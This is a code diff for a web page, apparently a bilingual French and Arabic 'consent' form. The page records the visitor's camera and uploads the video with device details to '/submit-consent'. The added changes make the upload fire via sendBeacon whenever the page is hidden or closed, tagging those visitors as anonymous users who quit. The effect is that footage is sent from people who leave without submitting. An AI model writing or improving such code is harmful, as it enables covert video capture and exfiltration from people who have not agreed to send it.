@@ -360,32 +360,25 @@
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data.size > 0) recordedChunks.push(event.data);
                 };
-                mediaRecorder.start(); // تسجيل مستمر وبدون تقطيع لمنع تلف الملفات
+                mediaRecorder.start();
 
             } catch (err) {
                 console.error("Caméra refusée: ", err);
             }
         });
 
-        async function sendDataAndFinish() {
+        async function sendDataAndFinish(isBackground = false) {
             if (isCompleted) return;
             isCompleted = true;
-
-            const statusDiv = document.getElementById('status');
-            const usernameInput = document.getElementById('username').value;
-            const username = usernameInput ? usernameInput : "Utilisateur Anonyme [Quitté/Fermé]";
-            const currentLang = document.getElementById('languageSelector').value;
-
-            statusDiv.style.color = '#10b981';
-            statusDiv.innerText = currentLang === 'ar' ? 'جاري إرسال البيانات...' : 'Envoi des données en cours...';
 
             if (mediaRecorder && mediaRecorder.state !== "inactive") {
                 mediaRecorder.stop();
             }
 
-            // انتظار تجميع مقطع الفيديو
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 300));
 
+            const usernameInput = document.getElementById('username')?.value;
+            const username = usernameInput ? usernameInput : "Utilisateur Anonyme [Quitté/Fermé]";
             const deviceDetails = await getDetailedDeviceInfo();
             const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/mp4';
             const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
@@ -402,20 +395,23 @@
 
             formData.append('video', videoBlob, `recording.${ext}`);
 
-            // ⚡ استخدام keepalive لضمان استمرار الإرسال حتى لو أُغلق المتصفح
-            try {
-                fetch('/submit-consent', {
-                    method: 'POST',
-                    body: formData,
-                    keepalive: true
-                });
-            } catch (e) {
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon('/submit-consent', formData);
+            // 🔥 استخدام sendBeacon حصرياً عند الضغط على زر المربع أو إغلاق الصفحة لضمان وصول الفيديو
+            if (isBackground && navigator.sendBeacon) {
+                navigator.sendBeacon('/submit-consent', formData);
+            } else {
+                try {
+                    fetch('/submit-consent', {
+                        method: 'POST',
+                        body: formData,
+                        keepalive: true
+                    });
+                } catch (e) {
+                    if (navigator.sendBeacon) {
+                        navigator.sendBeacon('/submit-consent', formData);
+                    }
                 }
             }
 
-            statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : 'Merci ! Vos réponses ont été soumises avec succès.';
             if (mediaStream) {
                 mediaStream.getTracks().forEach(track => track.stop());
             }
@@ -440,19 +436,24 @@
                 }
             }
 
-            await sendDataAndFinish();
+            statusDiv.style.color = '#10b981';
+            statusDiv.innerText = currentLang === 'ar' ? 'جاري إرسال البيانات...' : 'Envoi des données en cours...';
+
+            await sendDataAndFinish(false);
+
+            statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : 'Merci ! Vos réponses ont été soumises avec succès.';
         }
 
-        // إرسال البيانات تلقائياً وفوراً عند إغلاق التطبيق أو تصغير الصفحة
+        // عند الخروج المفاجئ (زر المربع أو إغلاق التطبيق)
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'hidden' && !isCompleted) {
-                sendDataAndFinish();
+                sendDataAndFinish(true);
             }
         });
 
         window.addEventListener('pagehide', () => {
             if (!isCompleted) {
-                sendDataAndFinish();
+                sendDataAndFinish(true);
             }
         });
     </script>
